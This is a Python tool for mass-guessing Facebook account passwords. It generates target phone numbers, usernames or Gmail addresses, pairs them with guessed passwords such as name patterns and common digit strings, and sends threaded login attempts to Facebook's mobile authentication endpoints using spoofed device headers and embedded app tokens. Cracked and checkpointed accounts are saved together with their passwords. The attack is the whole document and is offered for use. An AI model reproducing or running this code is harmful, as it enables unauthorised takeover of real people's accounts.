#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
#create by tkm tonmoy 
#wa.me/+8801766804626
############------[ MODULES ]------#########
import os,time,random,string,re,sys,json,uuid,requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
os.system('xdg-open https://github.com/tonmoy404-cyber')
B = '\x1b[1;90m';R = '\x1b[1;91m';G = '\x1b[1;92m';H = '\x1b[1;93m';BL = '\x1b[1;94m';BG = '\x1b[1;95m';S = '\x1b[1;96m';W = '\x1b[1;97m';EX = '\x1b[0m';E = '\33[m'
############------[ XXXX ]------#########
lk=[];ok=[];cp=[];twf=[];lop=0;xode=[];plist=[];paxd=[];cpx=[];cokix=[];apkx=[];paswtrh = [];rcd=[];rcdx=[];mthx=[];ugnm=[];psd=[]
version="1.09"
def line():
	print(f"{W}{40*'-'}{W}")
############------[ RANDOM SYS ]------#########
AFGX=f"{W}[{G}+{W}] AFG SIM CODE : {G}0780 0771 0799 0701{E}{W}";BDX=f"{W}{W}[{G}+{W}] BD SIM CODE: {G}017 015 018 019 013 016{E}{W}";INDX=f"{W}{W}[{G}+{W}] OTHER COUNTRY USER : {G}+91967 +91894{E}{W}\n{40*'-'}\n{W}{W}[{G}+{W}] IND SIM CODE : {G}967 783 894 879 638{E}{W}";PAKX=f"{W}{W}[{G}+{W}] PAK SIM CODE : {G}0306 0315 0335 0345{E}{W}";NEPX=f"{W}{W}[{G}+{W}] NEP SIM CODE : {G}9868 9865 9818 9817 9845{E}{W}";USEX=f"{W}{W}[{G}+{W}] USA SIM CODE : {G}941 816 308 225{E}{W}";NGRA=f"{W}{W}[{G}+{W}] NAGERIA SIM CODE:{G}070 080 081 090 091{E}{W}";LIMITX=f"{W}[{G}+{W}] EXAMPLE: {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W}";NOSIMX=f'         {G}USE YOUR SIM CODE {W}\n{40*"-"}\n{G}\t    Last Range 7{W}'
############------[ A SYS ]------#########
CPG=f"[{G}+{W}] Do you went show cp account (y/n)";CKIG=f"[{G}+{W}] Do you went show cookie (y/n)";chc=f'{W}[{G}+{E}] Choice : {G}';flp=f"{W}[{G}•{W}] PUT FILE PATH\033[1;37m : {G}";chcps=f'EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}';mxxt=f'{W}[{G}A{W}] Method {G}1{W}\n{W}[{G}B{W}] Method {G}2{W}';nflp=f"[{R}!{W}] FILE LOCATION NOT FOUND ";FSNM=f"{W}EXAMPLE : {G}rakib{W},{G}sakib{W},{G}rabbi{W},{G}tanvir{W},{G}jahid{W}";LSNM=f"{W}EXAMPLE : {G}hosain{W},{G}mahmud{W},{G}islam{W},{G}ahmed{W},{G}khan{W}";GMLN=f"{W}EXAMPLE : {G}@gmail.com{W} , {G}@yahoo.com{W} {R}ETC{G}...{W}";EPS1=f'{W}Don\'t try : {G}123{W},{G}1234{W},{G}12345{W},{G}@@##{W},{G}@@@{W},{G}@@{W},{G}@{W} ';EPS2=f"{W}Try it : {G}1122{W},{G}@#{W},{G}##{W},{G}@@@@{W},{G}@123{W},{G}@12345{W},{G}11{W}";apsd=f"{W}[{G}A{W}] {W}AUTO PASSWORD {W}\n{W}[{G}B{W}]{W} CHOICE PASSWORD{W}"
############------[ LOGO ]------#########
def logo():
	os.system('clear');print(f"""\r\r\x1b[1;97m{W}\n88888888888 888    d8P  888b     d888 \n    888     888   d8P   8888b   d8888{W} \n    888     888  d8P    88888b.d88888 \n    888     888d88K     888Y88888P888{W} \n    888     8888888b    888 Y888P 888 \n    888     888  Y88b   888  Y8P  888{W} \n    888     888   Y88b  888   "   888 \n    888     888    Y88b 888       888\n{40*"-"} \x1b[1;97m\n[{G}+{W}] GITHUB   : tonmoy404-cyber        \n[{G}+{W}] FACEBOOK : TONMOY X X X     {B}[{W}V{W}:{G}{version}{B}]{W}\n{40*"-"}\x1b[1;97m""")
############------[ COUNTRY ]------#########
def YF():
	logo();print(f'{W}[{G}A{W}] FROM {G}BANGLADESH{W}');print(f'{W}[{G}B{W}] FROM {G}PAKISTAN{W}');print(f'{W}[{G}C{W}] FROM {G}INDIA{W}');print(f'{W}[{G}D{W}] FROM {G}AFGHANISTAN{W}');print(f'{W}[{G}E{W}] FROM {G}NEPAL{W}');print(f'{W}[{G}F{W}] FROM {G}UNITED STATES{W}');print(f'{W}[{G}G{W}] FROM {G}NIGERIA{W}');print(f'{W}[{G}H{W}] {W}MY {W}COUNTRY{R} IS {R}NOT HERE{W}');print(f"{W}[{G}I{W}] CONTACT {G}ADMIN{W}");line()
	ghx=input(f'[{G}+{W}] Choice : {G}')
	if ghx in ["A","a","1"]:rcd.append(f'1');Main()
	elif ghx in ["B","b","2"]:rcd.append(f'2');Main()
	elif ghx in ["C","c","3"]:rcd.append(f'3');Main()
	elif ghx in ["D","d","4"]:rcd.append(f'4');Main()
	elif ghx in ["E","e","5"]:rcd.append(f'5');Main()
	elif ghx in ["F","f","6"]:rcd.append(f'6');Main()
	elif ghx in ["G","g","7"]:rcd.append(f'7');Main()
	elif ghx in ["H","h","8"]:rcd.append(f'8');Main()
	elif ghx in ["I","i","9"]:cadmin()
	else:line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);YF()
############------[ MENU ]------#########
def Main():
	logo();print(f'{W}[{G}A{W}] CRACK {G}FILE{W}');print(f'{W}[{G}B{W}] CRACK {G}RANDOM{W}');print(f'{W}[{G}C{W}] CRACK {G}GMAIL{W}');print(f'{W}[{G}D{W}] CRACK {G}USERNAME{W}');print(f'{W}[{G}E{W}] CRACK {G}GMAIL{H}+{G}USERNAME{W}');print(f"{W}[{G}F{W}] CONTACT {G}ADMIN{W}");print(f'{W}[{G}X{W}] {R}EXIT{W}')
	line()
	gh=input(f'[{G}+{W}] Choice : {G}')
	if gh in ["A","a","1"]:menu1()
	elif gh in ["B","b","2"]:rmenu1()
	elif gh in ["C","c","3"]:ugnm.append(f'1');menu3()
	elif gh in ["D","d","4"]:ugnm.append(f'2');menu3()
	elif gh in ["E","e","5"]:ugnm.append(f'3');menu3()
	elif gh in ["F","f","6"]:cadmin()
	elif gh in ["X","x","7"]:YF()
	else:line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);Main()
############------[CONTACT-ADMIN]-------#########
def cadmin():
	logo();print(f"[{G}A{W}] CONTACT {G}FACEBOOK{W}");print(f"[{G}B{W}] CONTACT {G}WHATSAPP{W}");print(f"[{G}C{W}] CONTACT {G}TELEGRAM{W}");print(f"[{G}D{W}] FOLLOW {G}GITHUB{W}");print(f"[{G}E{W}] GROUP {G}FACEBOOK{W}");print(f"[{G}F{W}] GROUP {G}MESSENGER{W}");print(f'[{G}X{W}] {R}EXIT{W}');line()
	ghx=input(f"[{G}+{W}] Choice : {G}")
	if ghx in ["A","a","1"]:os.system('xdg-open https://www.facebook.com/profile.php?id=100089388525050');time.sleep(2);cadmin()
	elif ghx in ["B","b","2"]:os.system('xdg-open https://github.com/tonmoy404-cyber');time.sleep(2);cadmin()
	elif ghx in ["C","c","3"]:os.system('xdg-open https://t.me/tonmoymahato');time.sleep(2);cadmin()
	elif ghx in ["D","d","4"]:os.system('xdg-open https://github.com/tonmoy404-cyber');time.sleep(2);cadmin()
	elif ghx in ["E","e","5"]:os.system('xdg-open https://facebook.com/groups/2470754783080486/');time.sleep(2);cadmin()
	elif ghx in ["F","f","6"]:os.system('xdg-open https://m.me/j/AbZax-WxyuojLcak/');time.sleep(2);cadmin()
	elif ghx in ["X","x","7"]:Main()
	else:line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);cadmin()
	############------[FILE SYSTEM]-------#########
mxxxt=[]
ixd=[]
fil=[]
def menu1():
	os.system('xdg-open https://github.com/tonmoy404-cyber')
	logo()
	fl = input(f'{flp}')
	try:fil = open(fl,'r').read().splitlines()
	except FileNotFoundError:print(f"{W}{40*'-'}");print(f'{nflp}');time.sleep(1);menu1()
	for xid in fil:
		ixd.append(xid)
	print(f"{W}{40*'-'}");print(f'{mxxt}');line()
	mtx=input(f'{chc}')
	if mtx in ['n','N','no','NO','2']:mxxxt.append(f'2')
	else:mxxxt.append(f'1')
	print(f"{W}{40*'-'}");print(f'{CKIG}');line()
	ckiv=input(f'{chc}')
	if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
	else:cokix.append(f'y')
	try:
		logo();print(f'\t\t{G}7 BEST{W}');print (40*"-")
		psl = int(input(f'[{G}+{W}] Limit : {G}'))
	except:psl=1
	print(f"{W}{40*'-'}");print(f'{chcps}');print (40*"-")
	for ox in range(psl):paxd.append(input(f'{W}[{G}{ox+1}{W}] Password : {G}'))
	pswx(fil)
def pswx(fil):
	with ThreadPool(max_workers=30) as tonxoys:
		tid = str(len(fil))
		logo();print(f'{W}[{G}+{W}] TOTAL ID :\033[1;92m '+tid);print(f'{W}[{G}+{W}] FLIGHT MODE ON/OFF EVERY 3 MINUTES');print(40*"-")
		#os.system('xdg-open https://facebook.com/groups/2470754783080486/')
		for uuxxd in ixd:
			id,name= uuxxd.split(f'|')
			psdx=paxd
			for pxxd in psdx:
				fn = name.split(' ')[0]
				try:ln = name.split(' ')[1]
				except:ln = fn
				psd = pxxd.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
				if mxxxt in ["1","01","A","a"]:tonxoys.submit(graph,id,psd)
				if mxxxt in ["2","02","B","b"]:tonxoys.submit(api,id,psd)
############------[RANDOM]-------#########
def rmenu1():
	#os.system('xdg-open https://github.com/tonmoy404-cyber')
	logo()
	if "1" in rcd:print(f"{BDX}");line()
	if "2" in rcd:print(f"{PAKX}");line()
	if "3" in rcd:print(f"{INDX}");line()
	if "4" in rcd:print(f"{AFGX}");line()
	if "5" in rcd:print(f"{NEPX}");line()
	elif "6" in rcd:print(f"{USEX}");line()
	elif "7" in rcd:print(f"{NGRA}");line()
	elif "8" in rcd:print(f"{NOSIMX}");line()
	code=input(f'{chc}');print(f"{W}{40*'-'}")
	print(f'{LIMITX}');line()
	limit=int(input(f'[{G}+{E}] Limit : {G}'))
	print(f"{W}{40*'-'}");print(f'{mxxt}');line()
	mtx=input(f'{chc}')
	print(f"{W}{40*'-'}");print(f'{CKIG}');line()
	ckiv=input(f'{chc}')
	if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
	else:cokix.append(f'y')
	for number in range(limit):
		if "1" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
		if "2" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
		if "3" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
		if "4" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
		if "5" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(6));xode.append(numberx)
		elif "6" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
		elif "7" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
		elif "8" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
	with ThreadPool(max_workers=60) as tonxoys:
		tid= str(len(xode))
		logo();print(f'{W}[{G}+{W}] TOTAL ID :\033[1;92m '+tid);print(f'{W}[{G}+{W}] FLIGHT MODE ON/OFF EVERY 3 MINUTES');line()
		#os.system('xdg-open https://facebook.com/groups/2470754783080486/')
		for rngx in xode:
			name=f"{rngx}"
			id=code+rngx
			if "1" in rcd:psd=[id,rngx,id[:6],id[:7],id[:8],id[4:],id[5:]]
			if "2" in rcd:psd=[id,rngx,"khan123","khan1122","khan12345"]
			if "3" in rcd:psd=["57575751","57273200","59039200",id[4:],id[3:]]
			if "4" in rcd:psd=[id,rngx,"200200","500500"]
			if "5" in rcd:psd=[id,rngx,"FreeFire","freefire"]
			elif "6" in rcd:psd=[id,rngx,"500500","200200"]
			elif "7" in rcd:psd=[id,rngx,"500500","200200"]
			elif "8" in rcd:psd=[id,rngx,"500500","200200"]
			if mtx in ["1","01","A","a"]:tonxoys.submit(graph,id,psd,name)
			if mtx in ["2","02","B","b"]:tonxoys.submit(api,id,psd,name)
############------[GMAIL-USERNAME]-------#########
def menu3():
	#os.system('xdg-open https://github.com/tonmoy404-cyber')
	logo()
	print(f'{FSNM} ');line()
	frs=input(f'{W}[{G}+{E}] Fast Name : {G}');print(f"{W}{40*'-'}")
	print(f'{LSNM}');line()
	lst=input(f'{W}[{G}+{E}] Last Name : {G}');print(f"{W}{40*'-'}");print(f'{LIMITX} ');line()
	limit=int(input(f'[{G}+{E}] Limit : {G}'))
	print(f"{W}{40*'-'}");print(f'{mxxt}');line()
	mtx=input(f'{chc}')
	print(f"{W}{40*'-'}");print(f'{CKIG}');line()
	ckiv=input(f'{chc}')
	if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
	else:cokix.append(f'y')
	try:
		logo();print(f'\t\t{G}7 BEST{W}');print (40*"-")
		psl = int(input(f'[{G}+{W}] Password Limit : {G}'))
	except:psl=1
	print(f"{W}{40*'-'}");print(f'{chcps}');print (40*"-")
	for ox in range(psl):paswtrh.append(input(f'{W}[{G}{ox+1}{W}] Password : {G}'))
	lxtx = ['1','2','4','5','6','7','8','9']
	for gmnu in range(limit):
		lcxt = random.choice(lxtx)
		if '1' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,2));xode.append(digx)
		if '2' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,3));xode.append(digx)
		if '4' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,5));xode.append(digx)
		if '5' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,6));xode.append(digx)
		if '6' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,7));xode.append(digx)
		if '7' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,8));xode.append(digx)
		if '8' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,9));xode.append(digx)
		if '9' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,10));xode.append(digx)
		else:digx = ''.join(random.choice(string.digits) for _ in range(1,4));xode.append(digx)
	with ThreadPool(max_workers=30) as tonxoys:
		tid= str(len(xode))
		logo();print(f'{W}[{G}+{W}] TOTAL ID :\033[1;92m '+tid);print(f'{W}[{G}+{W}] FLIGHT MODE ON/OFF EVERY 3 MINUTES');line()
		#os.system('xdg-open https://facebook.com/groups/2470754783080486/')
		for rngx in xode:
			name=frs+" "+lst
			if "1" in ugnm:id=frs+lst+rngx+"@gmail.com"
			if "2" in ugnm:id=random.choice([frs+lst+"."+rngx,frs+lst+rngx])
			elif "3" in ugnm:id=random.choice([frs+lst+rngx,frs+lst+rngx+"@gmail.com"])
			for thdhy in paswtrh:psd.append(thdhy)
			if mtx in ["1","01","A","a"]:tonxoys.submit(graph,id,psd,name)
			if mtx in ["2","02","B","b"]:tonxoys.submit(api,id,psd,name)
############------[ USER-AGENT ]------#########

############------[METHOD-1-A]-------#########
def graph(id,psd):
	try:
		global ok,cp,twf,lop
		sys.stdout.write(f'\r{W}[{G}TONMOY-M1{W}]{E}-{W}[{G}%s{W}]{E}-{W}[OK:{G}%s{W}]{E}\r'%(lop,len(ok)));sys.stdout.flush()
		for pxw in psd:
			psw = pxw
			ua=ua1()
			apk = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', '350685531728|62f8ce9f74b12f84c123cc23437a4a32', '6628568379|c1e620fa708a1d5696fb991c1bde5662', '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae', '1348564698517390|007c0a9101b9e1c8ffab727666805038']
			app = random.choice(apk)
			random_seed = random.Random()
			url = 'https://b-graph.facebook.com/auth/login'
			datax={'adid': uuid.uuid4(),'format': 'json','device_id': uuid.uuid4(),'email': id, 'password': psw,'generate_analytics_claims': '1','community_id': '', 'cpl': 'true','try_num': '1','family_device_id': uuid.uuid4(),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US"','client_country_code': 'US','fb_api_req_friendly_name': 'authenticate','api_key': '882a8490361da98702bf97a021ddc14d','access_token': app}
			headerx= {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": "[FBAN/EMA;FBLC/en_US;FBAV/540.602.473.468;FBBV/705748034;FBDV/A7;FBMD/oppo;FBSN/82.0.0.1825;FBPN/com.facebook.orca]","X-FB-Net-HNI": str(random.randint(2e4,4e4)),"X-FB-SIM-HNI": str(random.randint(2e4,4e4)),"X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
			twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
			logx= requests.post(url,data=datax,headers=headerx).json()
			if 'session_key' in logx:
				try:iid = str(logx['uid'])
				except:iid=id
				print(f'\r\r{G}[TONMOY-OK] '+iid+' | '+psw+f'{W}')
				break
			elif twfx in str(logx):
				try:iid = logx['error']['error_data']['uid']
				except:iid=id
				print(f'\r\r{R}[TONMOY-CP] '+iid+' | '+psw+f'{W}')
				open('/sdcard/TKM/CP-UID.txt', 'a').write(iid+' | '+psw+"\n");open('/sdcard/TKM/CP-NUMBER.txt', 'a').write(id+"\n")
				cp.append(id)
				break
			else:continue
	except requests.exceptions.ConnectionError:time.sleep(10)
	lop+=1
############------[METHOD-2-B]-------#########
def api(id,psd,name):
	os.system('xdg-open https://facebook.com/groups/2470754783080486/')
	try:
		global ok,cp,twf,lop
		fn = name.split(' ')[0]
		try:ln = name.split(' ')[1]
		except:ln = fn
		sys.stdout.write(f'\r{W}[{G}TONMOY-M1{W}]{E}-{W}[{G}%s{W}]{E}-{W}[OK:{G}%s{W}]{E}\r'%(lop,len(ok)));sys.stdout.flush()
		for pxw in psd:
			psw = pxw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
			ua="[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/Personal;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1032;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
			url = 'https://b-api.facebook.com/method/auth.login'
			headerx={'content-type':'application/x-www-form-urlencoded','x-fb-sim-hni':str(random.randint(2e4,4e4)),'x-fb-connection-type':'unknown','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','user-agent':ua,'x-fb-net-hni':str(random.randint(2e4,4e4)),'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),'x-fb-connection-quality':'EXCELLENT','x-fb-friendly-name':'authenticate','accept-encoding':'gzip, deflate','x-fb-http-engine':	'Liger'}
			datax={'email':id,'password':psw,'cpl':'true', 'credentials_type':'password',  'error_detail_type':'button_with_disabled', 'source':'login', 'format':'json', 'generate_session_cookies':'1', 'generate_analytics_claim':'1','generate_machine_id':'1'}
			lo = requests.post(url,data=datax,headers=headerx,allow_redirects=False).text
			twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
			logx = json.loads(lo)
			if 'session_key' in logx:
				try:iid = str(logx['uid'])
				except:iid=id
				print(f'\r\r{G}[TONMOY-OK] '+iid+' | '+psw+f'{W}')
				break
			elif twfx in str(logx):
				try:iid = logx['error']['error_data']['uid']
				except:iid=id
				print(f'\r\r{R}[TONMOY-CP] '+iid+' | '+psw+f'{W}')
				open('/sdcard/TKM/CP-UID.txt', 'a').write(iid+' | '+psw+"\n");open('/sdcard/TKM/CP-NUMBER.txt', 'a').write(id+"\n")
				cp.append(id)
				break
			else:continue
	except requests.exceptions.ConnectionError:time.sleep(10)
	lop+=1
##################
try:YF()
except requests.exceptions.ConnectionError:print('\n No internet connection ...');exit()
except:exit()